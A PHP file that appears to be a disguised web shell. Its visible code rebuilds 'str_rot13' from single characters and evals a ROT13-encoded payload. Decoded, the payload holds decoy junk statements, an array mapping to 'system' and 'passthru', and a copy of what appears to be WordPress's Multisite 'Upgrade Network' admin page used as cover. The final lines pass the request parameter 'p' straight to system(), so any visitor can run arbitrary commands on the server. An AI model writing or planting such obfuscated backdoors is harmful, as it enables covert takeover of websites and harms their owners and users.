<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr hctenqr nqzvavfgengvba cnary.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

erdhver_bapr NOFCNGU . JCVAP . '/uggc.cuc';

/**
 * @tybony vag $jc_qo_irefvba JbeqCerff qngnonfr irefvba.
 */
tybony $jc_qo_irefvba;

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Hctenqr Argjbex' );
$cnerag_svyr = 'hctenqr.cuc';

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Bayl hfr guvf fperra bapr lbh unir hcqngrq gb n arj irefvba bs JbeqCerff guebhtu Hcqngrf/Ninvynoyr Hcqngrf (ivn gur Argjbex Nqzvavfgengvba anivtngvba zrah be gur Gbbyone). Pyvpxvat gur Hctenqr Argjbex ohggba jvyy fgrc guebhtu rnpu fvgr va gur argjbex, svir ng n gvzr, naq znxr fher nal qngnonfr hcqngrf ner nccyvrq.' ) . '</c>' .
			'<c>' . __( 'Vs n irefvba hcqngr gb pber unf abg unccrarq, pyvpxvat guvf ohggba jvyy abg nssrpg nalguvat.' ) . '</c>' .
			'<c>' . __( 'Vs guvf cebprff snvyf sbe nal ernfba, hfref ybttvat va gb gurve fvgrf jvyy sbepr gur fnzr hcqngr.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/zhygvfvgr/nqzva/#argjbex-nqzva-hcqngrf-fperra\">Qbphzragngvba ba Hctenqr Argjbex</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

vs ( ! pheerag_hfre_pna( 'hctenqr_argjbex' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

rpub '<qvi pynff=\"jenc\">';
rpub '<u1>' . __( 'Hctenqr Argjbex' ) . '</u1>';

$npgvba = vffrg( $_TRG['npgvba'] ) ? $_TRG['npgvba'] : 'fubj';

fjvgpu ( $npgvba ) {
	pnfr 'hctenqr':
		$a = ( vffrg( $_TRG['a'] ) ) ? (vag) $_TRG['a'] : 0;

		vs ( $a < 5 ) {
			hcqngr_fvgr_bcgvba( 'jczh_hctenqr_fvgr', $jc_qo_irefvba );
		}

		$fvgr_vqf = trg_fvgrf(
			neenl(
				'fcnz'                   => 0,
				'qryrgrq'                => 0,
				'nepuvirq'               => 0,
				'argjbex_vq'             => trg_pheerag_argjbex_vq(),
				'ahzore'                 => 5,
				'bssfrg'                 => $a,
				'svryqf'                 => 'vqf',
				'beqre'                  => 'QRFP',
				'beqreol'                => 'vq',
				'hcqngr_fvgr_zrgn_pnpur' => snyfr,
			)
		);
		vs ( rzcgl( $fvgr_vqf ) ) {
			rpub '<c>' . __( 'Nyy qbar!' ) . '</c>';
			oernx;
		}
		rpub '<hy>';
		sbernpu ( (neenl) $fvgr_vqf nf $fvgr_vq ) {
			fjvgpu_gb_oybt( $fvgr_vq );
			$fvgrhey     = fvgr_hey();
			$hctenqr_hey = nqzva_hey( 'hctenqr.cuc?fgrc=hctenqr_qo' );
			erfgber_pheerag_oybt();

			rpub \"<yv>$fvgrhey</yv>\";

			$erfcbafr = jc_erzbgr_trg(
				$hctenqr_hey,
				neenl(
					'gvzrbhg'     => 120,
					'uggcirefvba' => '1.1',
					'ffyirevsl'   => snyfr,
				)
			);

			vs ( vf_jc_reebe( $erfcbafr ) ) {
				jc_qvr(
					fcevags(
						/* genafyngbef: 1: Fvgr HEY, 2: Freire reebe zrffntr. */
						__( 'Jneavat! Ceboyrz hcqngvat %1$f. Lbhe freire znl abg or noyr gb pbaarpg gb fvgrf ehaavat ba vg. Reebe zrffntr: %2$f' ),
						$fvgrhey,
						'<rz>' . $erfcbafr->trg_reebe_zrffntr() . '</rz>'
					)
				);
			}

			/**
			 * Sverf nsgre gur Zhygvfvgr QO hctenqr sbe rnpu fvgr vf pbzcyrgr.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz neenl $erfcbafr Gur hctenqr erfcbafr neenl.
			 */
			qb_npgvba( 'nsgre_zh_hctenqr', $erfcbafr );

			/**
			 * Sverf nsgre rnpu fvgr unf orra hctenqrq.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz vag $fvgr_vq Gur Fvgr VQ.
			 */
			qb_npgvba( 'jczh_hctenqr_fvgr', $fvgr_vq );
		}
		rpub '</hy>';
		?><c><?cuc _r( 'Vs lbhe oebjfre qbrf abg fgneg ybnqvat gur arkg cntr nhgbzngvpnyyl, pyvpx guvf yvax:' ); ?> <n pynff=\"ohggba\" uers=\"hctenqr.cuc?npgvba=hctenqr&nzc;a=<?cuc rpub ( $a + 5 ); ?>\"><?cuc _r( 'Arkg Fvgrf' ); ?></n></c>
		<fpevcg glcr=\"grkg/wninfpevcg\">
		<!--
		shapgvba arkgcntr() {
			ybpngvba.uers = \"hctenqr.cuc?npgvba=hctenqr&a=<?cuc rpub ( $a + 5 ); ?>\";
		}
		frgGvzrbhg( \"arkgcntr()\", 250 );
		//-->
		</fpevcg>
		<?cuc
		oernx;
	pnfr 'fubj':
	qrsnhyg:
		vs ( (vag) trg_fvgr_bcgvba( 'jczh_hctenqr_fvgr' ) !== $jc_qo_irefvba ) :
			?>
		<u2><?cuc _r( 'Qngnonfr Hcqngr Erdhverq' ); ?></u2>
		<c><?cuc _r( 'JbeqCerff unf orra hcqngrq! Arkg naq svany fgrc vf gb vaqvivqhnyyl hctenqr gur fvgrf va lbhe argjbex.' ); ?></c>
		<?cuc raqvs; ?>

		<c><?cuc _r( 'Gur qngnonfr hcqngr cebprff znl gnxr n yvggyr juvyr, fb cyrnfr or cngvrag.' ); ?></c>
		<c><n pynff=\"ohggba ohggba-cevznel\" uers=\"hctenqr.cuc?npgvba=hctenqr\"><?cuc _r( 'Hctenqr Argjbex' ); ?></n></c>
		<?cuc
		/**
		 * Sverf orsber gur sbbgre ba gur argjbex hctenqr fperra.
		 *
		 * @fvapr ZH (3.0.0)
		 */
		qb_npgvba( 'jczh_hctenqr_cntr' );
		oernx;
}
?>
</qvi>

<?cuc erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc'; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>